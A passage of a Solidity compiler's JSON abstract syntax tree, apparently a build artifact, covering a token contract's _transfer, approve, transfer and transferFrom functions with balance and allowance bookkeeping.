															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 23,
															"src": "2717:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 252,
														"indexExpression": {
															"argumentTypes": null,
															"id": 251,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 234,
															"src": "2727:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "2717:13:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 257,
																"name": "value",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 236,
																"src": "2751:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"expression": {
																"argumentTypes": null,
																"baseExpression": {
																	"argumentTypes": null,
																	"id": 253,
																	"name": "balanceOf",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 23,
																	"src": "2733:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																		"typeString": "mapping(address => uint256)"
																	}
																},
																"id": 255,
																"indexExpression": {
																	"argumentTypes": null,
																	"id": 254,
																	"name": "to",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 234,
																	"src": "2743:2:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "IndexAccess",
																"src": "2733:13:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 256,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "add",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 2248,
															"src": "2733:17:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																"typeString": "function (uint256,uint256) pure returns (uint256)"
															}
														},
														"id": 258,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "2733:24:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2717:40:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 260,
												"nodeType": "ExpressionStatement",
												"src": "2717:40:0"
											},
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 262,
															"name": "from",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 232,
															"src": "2781:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 263,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 234,
															"src": "2787:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 264,
															"name": "value",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 236,
															"src": "2791:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 261,
														"name": "Transfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															58
														],
														"referencedDeclaration": 58,
														"src": "2772:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 265,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2772:25:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 266,
												"nodeType": "EmitStatement",
												"src": "2767:30:0"
											}
										]
									},
									"documentation": null,
									"id": 268,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_transfer",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 237,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 232,
												"name": "from",
												"nodeType": "VariableDeclaration",
												"scope": 268,
												"src": "2604:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 231,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2604:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 234,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 268,
												"src": "2618:10:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 233,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2618:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 236,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 268,
												"src": "2630:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 235,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2630:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2603:41:0"
									},
									"returnParameters": {
										"id": 238,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2653:0:0"
									},
									"scope": 435,
									"src": "2585:219:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "private"
								},
								{
									"body": {
										"id": 286,
										"nodeType": "Block",
										"src": "2883:74:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 278,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 2356,
																"src": "2902:3:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 279,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "2902:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														{
															"argumentTypes": null,
															"id": 280,
															"name": "spender",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 270,
															"src": "2914:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 281,
															"name": "value",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 272,
															"src": "2923:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 277,
														"name": "_approve",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 230,
														"src": "2893:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 282,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2893:36:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 283,
												"nodeType": "ExpressionStatement",
												"src": "2893:36:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "74727565",
													"id": 284,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "bool",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "2946:4:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"value": "true"
												},
												"functionReturnParameters": 276,
												"id": 285,
												"nodeType": "Return",
												"src": "2939:11:0"
											}
										]
									},
									"documentation": null,
									"id": 287,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "approve",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 273,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 270,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 287,
												"src": "2827:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 269,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2827:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 272,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 287,
												"src": "2844:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 271,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2844:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2826:32:0"
									},
									"returnParameters": {
										"id": 276,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 275,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 287,
												"src": "2877:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 274,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "2877:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2876:6:0"
									},
									"scope": 435,
									"src": "2810:147:0",
									"stateMutability": "nonpayable",
									"superFunction": 512,
									"visibility": "external"
								},
								{
									"body": {
										"id": 305,
										"nodeType": "Block",
										"src": "3032:70:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 297,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 2356,
																"src": "3052:3:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 298,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "3052:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														{
															"argumentTypes": null,
															"id": 299,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 289,
															"src": "3064:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 300,
															"name": "value",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 291,
															"src": "3068:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 296,
														"name": "_transfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 268,
														"src": "3042:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 301,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3042:32:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 302,
												"nodeType": "ExpressionStatement",
												"src": "3042:32:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "74727565",
													"id": 303,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "bool",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "3091:4:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"value": "true"
												},
												"functionReturnParameters": 295,
												"id": 304,
												"nodeType": "Return",
												"src": "3084:11:0"
											}
										]
									},
									"documentation": null,
									"id": 306,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "transfer",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 292,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 289,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 306,
												"src": "2981:10:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 288,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2981:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 291,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 306,
												"src": "2993:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 290,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2993:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2980:27:0"
									},
									"returnParameters": {
										"id": 295,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 294,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 306,
												"src": "3026:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 293,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "3026:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3025:6:0"
									},
									"scope": 435,
									"src": "2963:139:0",
									"stateMutability": "nonpayable",
									"superFunction": 521,
									"visibility": "external"
								},
								{
									"body": {
										"id": 355,
										"nodeType": "Block",
										"src": "3225:244:0",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 327,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"baseExpression": {
																"argumentTypes": null,
																"id": 317,
																"name": "allowance",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 29,
																"src": "3239:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_mapping$_t_address_$_t_mapping$_t_address_$_t_uint256_$_$",
																	"typeString": "mapping(address => mapping(address => uint256))"
																}
															},
															"id": 319,
															"indexExpression": {
																"argumentTypes": null,
																"id": 318,
																"name": "from",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 308,
																"src": "3249:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"isConstant": false,
															"isLValue": true,
															"isPure": false,
															"lValueRequested": false,
															"nodeType": "IndexAccess",
															"src": "3239:15:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 322,
														"indexExpression": {
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 320,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 2356,
																"src": "3255:3:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 321,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "3255:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "IndexAccess",
														"src": "3239:27:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "!=",
													"rightExpression": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 325,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "UnaryOperation",
																"operator": "-",
																"prefix": true,
																"src": "3278:2:0",
																"subExpression": {
																	"argumentTypes": null,
																	"hexValue": "31",
																	"id": 324,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "3279:1:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_1_by_1",
																		"typeString": "int_const 1"
																	},
																	"value": "1"
																},
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_minus_1_by_1",
																	"typeString": "int_const -1"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_rational_minus_1_by_1",
																	"typeString": "int_const -1"
																}
															],
															"id": 323,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "3270:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_uint256_$",
																"typeString": "type(uint256)"
															},
															"typeName": "uint256"
														},
														"id": 326,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "3270:11:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "3239:42:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 346,
												"nodeType": "IfStatement",
												"src": "3235:171:0",
												"trueBody": {
													"id": 345,
													"nodeType": "Block",
													"src": "3283:123:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 343,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"baseExpression": {
																		"argumentTypes": null,
																		"baseExpression": {
																			"argumentTypes": null,
																			"id": 328,
																			"name": "allowance",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 29,
																			"src": "3297:9:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_mapping$_t_address_$_t_mapping$_t_address_$_t_uint256_$_$",
																				"typeString": "mapping(address => mapping(address => uint256))"
																			}
																		},
																		"id": 332,
																		"indexExpression": {
																			"argumentTypes": null,
																			"id": 329,
																			"name": "from",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 308,
																			"src": "3307:4:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		},
																		"isConstant": false,
																		"isLValue": true,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "IndexAccess",
																		"src": "3297:15:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																			"typeString": "mapping(address => uint256)"
																		}
																	},
																	"id": 333,
																	"indexExpression": {
																		"argumentTypes": null,
																		"expression": {
																			"argumentTypes": null,
																			"id": 330,
																			"name": "msg",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 2356,
																			"src": "3313:3:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_magic_message",
																				"typeString": "msg"
																			}
																		},
																		"id": 331,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "sender",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": null,
																		"src": "3313:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address_payable",
																			"typeString": "address payable"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"nodeType": "IndexAccess",
																	"src": "3297:27:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"id": 341,
																			"name": "value",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 312,
																			"src": "3376:5:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		],
																		"expression": {
																			"argumentTypes": null,
																			"baseExpression": {
																				"argumentTypes": null,
																				"baseExpression": {
																					"argumentTypes": null,
																					"id": 334,
																					"name": "allowance",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 29,
																					"src": "3327:9:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_mapping$_t_address_$_t_mapping$_t_address_$_t_uint256_$_$",
																						"typeString": "mapping(address => mapping(address => uint256))"
																					}
																				},
																				"id": 336,
																				"indexExpression": {
																					"argumentTypes": null,
																					"id": 335,
																					"name": "from",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 308,
																					"src": "3337:4:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_address",
																						"typeString": "address"
																					}
																				},
																				"isConstant": false,
																				"isLValue": true,
																				"isPure": false,
																				"lValueRequested": false,
																				"nodeType": "IndexAccess",
																				"src": "3327:15:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																					"typeString": "mapping(address => uint256)"
																				}
																			},
																			"id": 339,
																			"indexExpression": {
																				"argumentTypes": null,
																				"expression": {
																					"argumentTypes": null,
																					"id": 337,
																					"name": "msg",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 2356,
																					"src": "3343:3:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_magic_message",
																						"typeString": "msg"
																					}
																				},
																				"id": 338,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"memberName": "sender",
																				"nodeType": "MemberAccess",
																				"referencedDeclaration": null,
																				"src": "3343:10:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_address_payable",
																					"typeString": "address payable"
																				}
																			},
																			"isConstant": false,
																			"isLValue": true,
																			"isPure": false,
																			"lValueRequested": false,
																			"nodeType": "IndexAccess",
																			"src": "3327:27:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"id": 340,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "sub",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": 2270,
																		"src": "3327:31:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																			"typeString": "function (uint256,uint256) pure returns (uint256)"
																		}
																	},
																	"id": 342,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "3327:68:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "3297:98:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 344,
															"nodeType": "ExpressionStatement",
															"src": "3297:98:0"
														}
													]
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 348,
															"name": "from",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 308,
															"src": "3425:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 349,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 310,
															"src": "3431:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 350,
															"name": "value",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 312,
															"src": "3435:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 347,
														"name": "_transfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 268,
														"src": "3415:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 351,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3415:26:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 352,
												"nodeType": "ExpressionStatement",
												"src": "3415:26:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "74727565",
													"id": 353,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "bool",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "3458:4:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"value": "true"
												},
												"functionReturnParameters": 316,
												"id": 354,
												"nodeType": "Return",
												"src": "3451:11:0"
											}
										]
									},
									"documentation": null,
									"id": 356,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "transferFrom",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 313,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 308,
												"name": "from",
												"nodeType": "VariableDeclaration",
												"scope": 356,
												"src": "3139:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 307,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3139:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 310,
												"name": "to",
												"nodeType": "VariableDeclaration",
